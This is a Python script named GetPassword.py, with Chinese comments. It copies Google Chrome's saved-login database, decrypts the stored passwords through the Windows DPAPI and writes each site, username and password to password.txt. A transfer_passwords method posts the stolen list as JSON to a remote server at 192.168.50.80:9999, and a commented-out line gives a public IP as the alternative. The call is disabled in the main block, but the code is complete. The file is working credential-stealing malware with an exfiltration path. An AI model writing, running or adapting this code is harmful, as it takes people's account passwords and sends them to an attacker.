# !/usr/bin/python3
# @File: GetPassword.py
# --coding:utf-8--
# @Author:kinni
# @Time:  2019年11月12日 15:55:33
# 说明://80版本后  Chrome加密方式改變  https://github.com/AlessandroZ/LaZagne


import os
import  shutil
import  sqlite3
import  win32crypt
import json
import requests

APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'


class ChromePassword:
    def __init__(self):
        self.passwordList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path,_temp_path)
        self.show_password(_temp_path)

    def show_password(self,db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            ret = win32crypt.CryptUnprotectData(row[2],None,None,None,0)
            #密码解析后得到字节码，需要进行解码操作
            _info = 'url:%-40s username:%-20s password:%s\n' %\
                    (row[0][:50],row[1],ret[1].decode())
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def save_passwords(self):
        with open('password.txt','w',encoding='utf-8') as f:
            f.writelines(self.passwordList)

    def transfer_passwords(self):
        try:
            #远程Flask对应的IP:PORT
            requests.post('http://192.168.50.80:9999/index',data=json.dumps(self.passwordList))
            # requests.post('http://125.36.118.253:9999/index', data=json.dumps(self.passwordList))
        except requests.exceptions.ConnectionError:
            pass


if __name__=="__main__":
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()
   # Main.transfer_passwords()


     #初始样子
# db_file_path = os.path.join(os.environ['LOCALAPPDATA'],r'Google\Chrome\User Data\Default\Login Data')
#
# tmp_file =os.path.join(os.environ['LOCALAPPDATA'],'sqlite_file')
# print(tmp_file)
#
# if os.path.exists(tmp_file):
#     os.remove(tmp_file)
# shutil.copyfile(db_file_path,tmp_file)
#
# conn = sqlite3.connect(tmp_file)
# for row in conn.execute('select signon_realm,username_value,password_value from logins'):
#     ret = win32crypt.CryptUnprotectData(row[2],None,None,None,0)
#     print('网站：%-50s,用户名：%-20s,密码：%s'%(row[0][:50],row[1],ret[1].decode('gbk')))
#
# conn.close()
# os.remove(tmp_file)